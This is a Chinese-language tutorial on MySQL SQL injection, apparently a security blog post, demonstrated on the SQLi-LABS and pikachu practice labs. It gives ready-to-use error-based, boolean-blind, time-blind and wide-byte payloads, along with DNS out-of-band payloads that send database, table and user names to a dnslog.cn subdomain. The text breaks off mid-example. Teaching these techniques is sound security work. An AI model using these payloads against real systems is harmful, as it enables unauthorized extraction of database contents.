<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e)) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e)) --+</span><br></pre></td></tr></table></figure>
<h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_document,xpath_string,new_value)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：xpath_string是xpath格式的字符串</li>
<li>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and updatexml(1,concat(0x7e,(select语句),0x7e),1) --+</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆字段名：&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME),0x7e),1) --+</span><br></pre></td></tr></table></figure>
<h3 id="主键重复错误"><a href="#主键重复错误" class="headerlink" title="主键重复错误"></a>主键重复错误</h3><p><strong>rand()：</strong></p>
<blockquote>
<p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>
</blockquote>
<p><strong>floor()：</strong></p>
<blockquote>
<p>对任意正或者负的十进制值向下取整</p>
</blockquote>
<p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p>
<p><strong>group by</strong></p>
<blockquote>
<p>group by是根据一个或多个列对结果集进行分组的sql语句</p>
</blockquote>
<p><strong>报错原理：</strong></p>
<ul>
<li>如果<code>count(*)</code>与<code>group by</code>同时出现在SQL语句中，就会产生虚拟表。</li>
<li>向虚拟表中插入数据的操作包含两个动作：检查主键是否存在；如果不存在就插入新的主键，如果存在就将该主键所对应的的<code>count(*)</code>的值加1。</li>
<li>检查的主键值与插入的主键值不同的情况很少见。如果主键是函数表达式<code>floor(rand(0)*2)</code>，主键值是伪随机数列中的元素，那么在检查主键和插入主键时产生的两个值就可能不同。</li>
<li>由于<code>floor(rand(0)*2)</code>产生的值在检查虚拟表主键时与表内的主键值并不重复，因此会向虚拟表插入“新的”主键。但是，在插入时又会重新计算<code>floor(rand(0)*2)</code>的值，如果第二次计算的值刚好跟第一次计算的值不一样，又恰巧与表内现有的主键值重复，将导致MySQL报错。</li>
</ul>
<p>payload结构：<code>&#39;and (select 1 from (select count(*),concat(0x7e,(select语句),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x)a)--+</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/sXLmv31tN72cGlY.png" alt="736de83719ff30ab41dcd3a546daf538.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a) --+</span><br><span class="line"></span><br><span class="line">爆列名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot; limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and (select 1 from (select count(*),concat(0x7e,(select COLUMN_NAME from TABLE_NAME limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br></pre></td></tr></table></figure>
<h2 id="基于布尔运算的盲注"><a href="#基于布尔运算的盲注" class="headerlink" title="基于布尔运算的盲注"></a>基于布尔运算的盲注</h2><p>基于布尔运算的盲注（Boolean-based blind SQL injection）是盲注的一种。</p>
<p>下面简单介绍一下盲注。如果攻击者想要获取信息无法直接显示在页面上，那么他可以通过返回页面的内容或响应时间的不同来获取相关信息，这种方式叫做盲注。盲注的信息获取效率不如其他类型的注入。在基于布尔运算的盲注后，应用程序仅会返回包含“True”或“False”的页面，因此，在一次完整的信息获取过程中往往需要多次进行请求和试探。</p>
<p>最简单的基于布尔盲注，形如<code>and 1=1</code> <code>and 1=2</code>。如果两次请求返回的页面不一样，则表示该接口处存在注入点。</p>
<p>如何利用布尔盲注payload获取数据？首先要了解MySQL的字符串截取函数，它们在构造payload的过程中起着重要作用。</p>
<ul>
<li>mid()函数：mid(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>substr()函数：substr(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>left()函数：left(string,length)，对字符串string，从左开始取length个字符的子串。</li>
<li>right()函数：right(string,length)，对字符串string，从右开始取length个字符的子串。</li>
</ul>
<p>构造布尔盲注的payload，其核心思想是：利用截取函数将想要获取信息的字符串拆分成单个字符，然后使用二分查找法进行猜解。</p>
<h3 id="测试正常回显与错误回显"><a href="#测试正常回显与错误回显" class="headerlink" title="测试正常回显与错误回显"></a>测试正常回显与错误回显</h3><p>在这里使用SQLi-LABS靶场第8关进行演示</p>
<p>正常回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211006102936406.png" alt="image-20211006102936406"></p>
<p>错误回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/CNHXkE6QUd3RPVb.png" alt="c6abaef7e5faca1a6342f7154f292ecc.png"></p>
<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>判断数据库的第1个字符的ASCII是否大于100</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006094959115.png" alt="image-20211006094959115"></p>
<p>回显正常，说明大于100</p>
<p>判断是否大于120</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;120 --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/q6iRxYUKrTjSZlz.png" alt="bca1a9293491d8b26bc5d5d753f131d3.png"></p>
<p>回显错误，说明不大于120</p>
<p>通过二分法以此类推，最终可以判断第一个字符的ASCII值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/MIyOiTVDA9psurq.png" alt="963d023bcf803d5370102ec74f3f3734.png"></p>
<p>通过查找ASCII表可以判断该字符为“s”</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/B8AGKLWJPS6Ng5Z.png" alt="79bb022428457989a1a33062014d1400.png"></p>
<p>同理，其他字符也可以通过盲注得出</p>
<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>步骤同上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;65 --+</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>当使用其他方法无法从数据库服务器中检索信息时，攻击者就有可能使用基于时间的盲注（Time-based blind SQL injection）进行注入。其原理是：利用MySQL中的延迟函数查看SQL语句是否可以执行，也可以理解为通过页面响应时间判断延时语句是否执行成功，进而通过推断得到一些信息。所以时间型盲注也是一种边信道攻击。</p>
<h3 id="测试能否使用延时盲注"><a href="#测试能否使用延时盲注" class="headerlink" title="测试能否使用延时盲注"></a>测试能否使用延时盲注</h3><p>在这里使用SQLi-LABS靶场第9关进行演示</p>
<p>通过<code>and 1=1</code> <code>and 1=2</code> 无法判断回显正确与错误</p>
<p>这时查看能否使用sleep()函数测试</p>
<p>测试正常数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006102818321.png" alt="image-20211006102818321"></p>
<p>说明and前的语句执行成功，执行sleep(5)，使得加载时多花了5秒时间</p>
<p>测试错误数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=-1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/jSZ1LVHYzgJeQNB.png" alt="e996bf3ced4f390797e770ab07d9bc86.png"></p>
<p>说明and前的语句执行错误，就不执行sleep(5)，加载时间和原来一样</p>
<p>通过这一特性，就可以使用布尔型盲注一样的方法去测试。</p>
<h3 id="猜解数据库名-1"><a href="#猜解数据库名-1" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解表名-1"><a href="#猜解表名-1" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名-1"><a href="#猜解字段名-1" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据-1"><a href="#猜解数据-1" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,sleep(5),null) --+</span><br></pre></td></tr></table></figure>
<h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a>BENCHMARK()函数</h3><p>在MySQL中，有一个<code>BENCHMARK()</code>函数，它是用于测试函数性能的。它有两个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
<p>函数执行的结果，是将表达式<code>expr</code>执行<code>count</code>次。</p>
<p>因此，利用<code>BENCHMARK()</code>函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短变化，可以判断出注入语句是否执行成功。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">猜解数据库名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解表名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解字段名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解数据：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,BENCHMARK(10000000,MD5(1)),null) --+</span><br></pre></td></tr></table></figure>
<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><h3 id="什么是带外通道技术"><a href="#什么是带外通道技术" class="headerlink" title="什么是带外通道技术"></a>什么是带外通道技术</h3><p>在渗透中，经常碰到关闭回显的漏洞，常见的XXE盲注，SQL盲注，反序列化无回显，这个时候常用到OOB带外数据通道，带外通道技术（OOB）让攻击者能够通过另一种方式来确认和利用所谓的盲目（blind）的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p>
<h3 id="OOB利用原理"><a href="#OOB利用原理" class="headerlink" title="OOB利用原理"></a>OOB利用原理</h3><p>1、常规SQL注入，获取服务器信息的方式</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/I58SWpJs9d3yuPT.png" alt="img"></p>
<p>2、SQL注入利用DNS获取查询结果（OOB）</p>
<p>我们需要一个三级域名服务器（nameserver）也是DNS服务器（DNS Server），也就是下图的schloar服务器。</p>
<p>还需要配置域名“www.scholar.com”对应的解析IP地址为“schloar服务器”的IP地址。</p>
<p>这样就能够实时地监控域名查询请求了，图示如下：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/9wiITvejCJ5OAYS.png" alt="img"></p>
<h3 id="DNS带外注入靶场复现"><a href="#DNS带外注入靶场复现" class="headerlink" title="DNS带外注入靶场复现"></a>DNS带外注入靶场复现</h3><h4 id="实验提准备——DNSLog"><a href="#实验提准备——DNSLog" class="headerlink" title="实验提准备——DNSLog"></a>实验提准备——DNSLog</h4><p>打开DNSLog网站 (<a target="_blank" rel="noopener" href="http://www.dnslog.cn)，点击Get">http://www.dnslog.cn)，点击Get</a> SubDomain得到一个子域名</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/FyotJ3mSiKadfbz.png" alt="d0ae8c347502f14c5927c668dfa717b4.png"></p>
<p>发送ICMP包进行测试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping cs1qjb.dnslog.cn</span><br></pre></td></tr></table></figure>
<p>回到DNSLog页面，刷新记录即可得到刚才ping查询的结果</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/AKbO8e562qZfriN.png" alt="57fb30bbb46e75026e10984eeafb1517.png"></p>
<h4 id="实验前准备——load-file"><a href="#实验前准备——load-file" class="headerlink" title="实验前准备——load_file()"></a>实验前准备——load_file()</h4><p>MySQL使用带外注入的前提数据库必须配置<code>secure_file_priv</code>，且当前用户拥有读写数据的权限。</p>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>注：<em>.</em>指所有数据库的数据表；user为当前用户；%为所有ip地址</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(&quot;\\\\test.cs1qjb.dnslog.cn\\xxx.txt&quot;)--+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061046744.png" alt="705994f52d3311ab0d725a7d25746092.png"></p>
<p>新增一条查询记录，可以进行带外注入</p>
<h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,database(),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/69OCAfLmvB3dDgS.png" alt="de6479cb29b3eacef1c3fea89821f39c.png"></p>
<h4 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/e26OHWr7myfvzsJ.png" alt="756705f2f600b14b681581c698792ac6.png"></p>
<h4 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/f2JXxzIacOhnNDL.png" alt="de2a849c5c357b5090903f062a9ec218.png"></p>
<h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select username from users limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/kGQjpMioBnr219q.png" alt="7b22f942a9dc01baf397d5397c0bc3cf.png"></p>
<h2 id="基于字符集的宽字节注入"><a href="#基于字符集的宽字节注入" class="headerlink" title="基于字符集的宽字节注入"></a>基于字符集的宽字节注入</h2><h3 id="宽字节注入介绍与原理"><a href="#宽字节注入介绍与原理" class="headerlink" title="宽字节注入介绍与原理"></a>宽字节注入介绍与原理</h3><p>注入攻击中常常会用单引号<code>&#39;</code>、双引号<code>&quot;</code>等特殊字符。在应用中，开发者为了安全，经常会使用转义字符<code>\</code>来转义这些特殊字符。当数据库使用了“宽字符集”时，可能会产生一些意想不到的漏洞。</p>
<p>想要深入理解MySQL中的宽字节注入，首先要了解一些转义函数（PHP），包括<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>、<code>magic_quote_gpc</code>（高版本的PHP去掉了这个函数）。转义函数可用于将MySQL注入Payload中的部分危险字符转义，使攻击者无法有效截断原语句并拼接自己想要的Payload语句，起到安全防护的作用。</p>
<p>宽字节是指两个字节的宽度的编码技术，例如GB2312、GBK、GB18030、BIG5等。宽字节对转义字符的影响发生在<code>character_set_client=gbk</code>的情况下，也就是说，如果客户端发送的数据使用的字符集是GBK，就可能会“吃掉”转义字符<code>\</code>，进而导致转义失败，执行攻击者构造的Payload。</p>
<p>若存在宽字节注入，攻击者在输入<code>%df%27</code>时，首先会通过前面提到的单引号转义，将其转换为<code>%df%5c%27</code>（<code>%5c</code>是反斜杠<code>\</code>的URL编码）。在进行数据库查询之前，由于使用了GBK多字节编码（在汉字编码范围内两个字节会被编码为一个汉字），MySQL服务器会对查询语句进行GBK编码，即将<code>%df%5c</code>转换成汉字“<strong>運</strong>”，而单引号将会“逃逸”，在使用查询语句中的单引号闭合。</p>
<h3 id="宽字节注入靶场复现"><a href="#宽字节注入靶场复现" class="headerlink" title="宽字节注入靶场复现"></a>宽字节注入靶场复现</h3><p>在这里使用pikachu靶场的宽字节注入进行演示。</p>
<p>首先提交表单并使用burpsuite进行抓包</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/kJ9Xp4u3Pig25Oa.png" alt="44ad00a591e2148b85cc3cf22d8009fe.png"></p>
<p>发送到Repeater，构造payload <code>1%df&#39; or 1=1 #</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/IGqYLAja7UPKbtC.png" alt="51a94ef6ff0f91bd17d192f75261d158.png"></p>
<p>可以看出爆出所有用户数据。</p>
<p>宽字节注入是绕过转义函数的一种手段，可结合其他注入攻击方式，payload很好构造，只需是在单引号前加上<code>%df</code>。</p>
<p>另外，基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。比如在XSS攻击时，由于浏览器与服务器返回的字符编码不同，也可能会存在字符集攻击。</p>
<p>要解决这种问题，需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。统一设置为UTF-8是一个很好的方法。</p>
<h2 id="超长字符截断注入"><a href="#超长字符截断注入" class="headerlink" title="超长字符截断注入"></a>超长字符截断注入</h2><h3 id="超长字符截断原理"><a href="#超长字符截断原理" class="headerlink" title="超长字符截断原理"></a>超长字符截断原理</h3><p>在MySQL的配置选项中，有一个sql_mode选项。定义了mysql应该支持的sql语法，数据校验等。可以通过以下方式查看当前数据库使用的sql_mode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@sql_mode;</span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/csaqRrNnOdePlxV.png" alt="img"></p>
<p>mysql5.0版本以上支持了三种sql_mode模式，如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>模式</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ANSI</td>
<td>宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，报warning警告。</td>
</tr>
<tr>
<td>TRADITIONAL</td>
<td>传统模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误。用于事务时，会进行事务的回滚。</td>
</tr>
<tr>
<td>STRICT_TRANS_TABLES</td>
<td>严格模式，进行数据的严格校验，错误数据不能插入，报error错误。</td>
</tr>
</tbody>
</table>
</div>
<p>默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error（<strong>如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告。</strong>）。</p>
<p>其实这个注入姿势很难找到了，因为它需要满足以下条件：</p>
<ul>
<li>可以注册用户，而且可以注册带有空格的用户</li>
<li>你需要知道管理员的账号</li>
</ul>
<p>查看以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table test(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; username varchar(20),</span><br><span class="line">    -&gt; password varchar(30)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.31 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into test(id,username,password) values(1,&quot;admin                                                                                            hello  &quot;,&quot;aaaaaaaa&quot;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,username,password from test;</span><br><span class="line">+------+----------------------+----------+</span><br><span 